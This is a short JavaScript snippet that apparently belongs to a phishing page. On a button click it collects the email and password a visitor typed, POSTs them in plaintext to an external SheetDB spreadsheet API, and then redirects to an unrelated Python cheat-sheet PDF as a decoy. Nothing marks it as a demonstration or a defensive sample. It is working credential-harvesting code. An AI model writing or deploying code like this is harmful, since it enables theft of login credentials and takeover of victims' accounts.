document.getElementById("nextBtn").addEventListener("click", async function (event) {
  event.preventDefault(); // Prevent default form submission

  // Collect data
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Validate inputs
  if (!email || !password) {
    alert("Please fill in both email and password fields.");
    return;
  }

  // Send data to SheetDB
  try {
    const response = await fetch("https://sheetdb.io/api/v1/ryfvidjjqmoam", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ data: { Email: email, Password: password } }),
    });

    const result = await response.json();
    if (response.ok) {
      alert("Data saved successfully!");
      // Redirect to the PDF file
      window.location.href = "https://allinpython.com/wp-content/uploads/2023/09/Python-Cheat-Sheet.pdf"; // Replace with your PDF URL
    } else {
      alert("Failed to save data: " + (result.error || "Unknown error"));
    }
  } catch (error) {
    console.error("Error:", error);
    alert("An error occurred while saving data.");
  }
});
